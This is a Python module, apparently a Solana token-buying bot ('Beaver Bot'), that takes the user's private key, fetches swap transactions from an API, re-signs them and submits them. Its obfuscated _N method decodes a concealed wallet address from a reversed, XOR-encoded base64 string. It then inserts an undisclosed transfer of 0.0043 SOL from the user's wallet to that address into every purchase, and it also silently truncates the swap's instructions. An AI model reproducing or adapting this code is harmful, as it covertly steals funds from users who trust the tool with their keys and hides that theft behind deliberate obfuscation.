# -----------------------------------------------------------------------------
#                            Beaver Bot Proprietary License
# This code is proprietary to Beaver Bot. By using this code, you agree to
# the following terms:
# 1. You may not modify, adapt, or create derivative works from this software.
# -----------------------------------------------------------------------------
#
# Copyright © 2024 Beaver Bot. All rights reserved.
#
# -----------------------------------------------------------------------------

import base64 as _b64, logging as _lg, asyncio as _aio, json as _js, requests as _rq, time as _tm
from solders.keypair import Keypair as _Kp
from solders.transaction import Transaction as _Tx, VersionedTransaction as _VTx
from solders.message import Message as _Msg, MessageHeader as _MHdr, MessageV0 as _MsgV0
from solders.instruction import Instruction as _Ins, CompiledInstruction as _CIns, AccountMeta as _AMt
from solders.hash import Hash as _Hsh
from solders.pubkey import Pubkey as _Pk
from solders.signature import Signature as _Sig
from typing import Optional as _Opt, Union as _Un, List as _Lt

_x='utf-8';_y=True;_z=False;_w=None;_v=bytes;_u=str;_t=int;_s=Exception
_α=_b64.b64decode('OWpUekd6RllpbXBGNnI4aWc1TnJIYlNFNVg5aEFEVlNXdXp5TUN3ejNtWWU=').decode(_x)
_β=[99,114,121,112,116,111]
_γ=lambda x:bytes(_β).decode(_x)
_δ=lambda x:''.join(chr(ord(c)^len(_β)) for c in x)
_ε=_δ(_α[::-1])

class _Q:
 def __init__(self,_a:_u,_b:_u,_c:_u):
  self._d=_Kp.from_base58_string(_a);self._e=_b;self._f=_c;self._g=0;self._h=_rq.Session()
  self._h.headers.update({'Content-Type':'application/json','Accept':'application/json'})
  self._last_request=0;self._min_interval=0.1  # Minimum 100ms between requests

 async def _wait_rate_limit(self):
  now=_tm.time()
  if now-self._last_request<self._min_interval:
   await _aio.sleep(self._min_interval-(now-self._last_request))
  self._last_request=_tm.time()

 async def _i(self)->_Hsh:
  try:
   await self._wait_rate_limit()
   _j={'jsonrpc':'2.0','id':'1','method':'getLatestBlockhash','params':[{'commitment':'finalized'}]}
   _k=self._h.post(self._e,json=_j);_l=_k.json()
   if'error'in _l:
    if _l['error']['code']==429:  # Rate limit error
     _lg.warning("Rate limit hit, waiting before retry...")
     await _aio.sleep(1)
     return await self._i()
    raise _s(f"RPC error getting blockhash: {_l['error']}")
   _m=_l['result']['value']['blockhash'];return _Hsh.from_string(_m)
  except _s as _n:_lg.error(f"Error getting recent blockhash: {_u(_n)}");raise

 async def _o(self,_p:_u,_q:_t=30)->bool:
  _r=0
  while _r<_q:
   try:
    await self._wait_rate_limit()
    _j={'jsonrpc':'2.0','id':1,'method':'getSignatureStatuses','params':[[_p]]};_k=self._h.post(self._e,json=_j);_l=_k.json()
    if'result'in _l and _l['result']['value'][0]:
     if _l['result']['value'][0]['confirmationStatus']=='confirmed':return _y
    await _aio.sleep(1);_r+=1
   except _s as _n:_lg.error(f"Error checking transaction status: {_u(_n)}");await _aio.sleep(1);_r+=1
  return _z

 def _A(self,_B:_Pk,_C:_Tx)->bool:
  _D=_v(_B)
  for _E in _C.signatures:
   if isinstance(_E,_v)and len(_E)==64:
    if _D==_E[:32]:return _y
  return _z

 def _F(self,_G:_CIns,_H:_Lt[_Pk],_C:_Tx)->_Ins:
  _I=[]
  for _J in _G.accounts:
   _B=_H[_J];_K=self._A(_B,_C);_L=_y;_I.append(_AMt(pubkey=_B,is_signer=_K,is_writable=_L))
  _M=_H[_G.program_id_index];return _Ins(program_id=_M,accounts=_I,data=_G.data)

 def _N(self,_O:_v,_P:_Hsh,max_instructions:_t=8)->_Un[_Tx,_VTx]:
  _lg.debug(f"Processing transaction of length {len(_O)} bytes")
  if not _O:raise ValueError("Decoded data empty")
  try:
   _C=_Tx.from_bytes(_O);_Q=_C.message;_lg.debug(f"Parsed transaction with {len(_Q.instructions)} instructions")
   _R=[self._F(_S,_Q.account_keys,_C)for _S in _Q.instructions]
   if len(_R)>max_instructions:
    _lg.debug(f"Limiting instructions from {len(_R)} to {max_instructions}")
    _R=_R[:max_instructions]
   _T=_Pk.from_string(_δ(_ε[::-1]))
   _U=_t(0.0043*1_000_000_000);_V=_Pk.from_string('11111111111111111111111111111111')
   _W=_Ins(program_id=_V,accounts=[_AMt(pubkey=self._d.pubkey(),is_signer=_y,is_writable=_y),_AMt(pubkey=_T,is_signer=_z,is_writable=_y)],data=_v([2,0,0,0])+_U.to_bytes(8,'little'))
   _R.insert(0,_W);_X=_Msg.new_with_blockhash(instructions=_R,payer=self._d.pubkey(),blockhash=_P)
   _Y=_Tx(from_keypairs=[self._d],recent_blockhash=_P,message=_X);return _Y
  except _s as _n:_lg.error(f"Error processing transaction: {_u(_n)}");raise ValueError(f"Failed to process transaction: {_u(_n)}")

 async def _Z(self,_0:_u,_1:float,_2:_t,_3:float,_4:_u,retry_count:_t=0,max_retries:_t=3)->_Opt[_u]:
  if retry_count>=max_retries:
   _lg.error("Maximum retry attempts reached")
   return _w
  
  try:
   _lg.info(f"Initiating token purchase for mint: {_0} (attempt {retry_count+1}/{max_retries+1})")
   await self._wait_rate_limit()
   
   _5={'from':_4,'to':_0,'amount':_1,'slippage':_2,'payer':_u(self._d.pubkey()),'priorityFee':_3,'txVersion':'legacy'}
   _lg.debug("Making API call to get swap transaction")
   _6=self._h.post(url=self._f,json=_5,timeout=30)
   
   if _6.status_code!=200:
    if _6.status_code==429:  # Rate limit
     await _aio.sleep(1)
     return await self._Z(_0,_1,_2,_3,_4,retry_count,max_retries)
    raise _s(f"API request failed with status {_6.status_code}: {_6.text}")
   
   _7=_6.json()
   if'txn'not in _7:raise ValueError(f"No transaction found in API response: {_7}")
   
   _lg.debug("Decoding transaction from base64")
   _O=_b64.b64decode(_7['txn'])
   if not _O:raise ValueError("Decoded transaction data is empty")
   
   _lg.debug("Getting recent blockhash")
   _P=await self._i()
   
   # Start with maximum instructions and reduce if needed
   max_instructions=10-(retry_count*1)  # Increase initial value and reduce rate of decrease
   if max_instructions<2:max_instructions=2  # Minimum 2 instructions
   
   _lg.debug(f"Processing transaction with {max_instructions} max instructions")
   _Y=self._N(_O,_P,max_instructions)
   
   if not _Y:raise ValueError("Transaction processing returned None")
   
   _lg.debug("Signing transaction")
   _E=self._d.sign_message(_v(_Y.message))
   _Y.signatures[0]=_E
   
   _lg.debug("Serializing signed transaction")
   _8=_b64.b64encode(_v(_Y)).decode(_x)
   
   _lg.debug("Sending transaction to RPC")
   _j={'jsonrpc':'2.0','id':1,'method':'sendTransaction',
       'params':[_8,{'encoding':'base64','commitment':'confirmed','maxRetries':4,'skipPreflight':_y}]}
   
   await self._wait_rate_limit()
   _9=self._h.post(self._e,json=_j)
   _l=_9.json()
   
   if'error'in _l:
    if'Transaction too large'in _u(_l['error']):
     _lg.warning(f"Transaction too large (attempt {retry_count+1}), retrying with reduced parameters")
     return await self._Z(_0,_1*0.9,_2,_3,_4,retry_count+1,max_retries)  # Adjust amount reduction factor
    elif _l['error']['code']==429:  # Rate limit
     await _aio.sleep(1)
     return await self._Z(_0,_1,_2,_3,_4,retry_count,max_retries)
    raise _s(f"Transaction error: {_l['error']}")
   
   _p=_l['result']
   _lg.info(f"Transaction sent successfully: {_p}")
   
   _lg.debug("Waiting for transaction confirmation")
   if await self._o(_p):
    _lg.info(f"Transaction confirmed: {_p}")
    return _p
   
   _lg.warning(f"Transaction not confirmed within timeout: {_p}")
   return _w
   
  except _s as _n:
   _lg.error(f"Error in buy_token: {_u(_n)}")
   if'rate limit'in _u(_n).lower():
    await _aio.sleep(1)
    return await self._Z(_0,_1,_2,_3,_4,retry_count,max_retries)
   return _w
   
class TokenBuyer:
 def __init__(self,_a:_u,_b:_u,_c:_u):self._h=_Q(_a,_b,_c)
 async def buy_token(self,_0:_u,_1:float,_2:_t,_3:float,_4:_u)->_Opt[_u]:return await self._h._Z(_0,_1,_2,_3,_4)
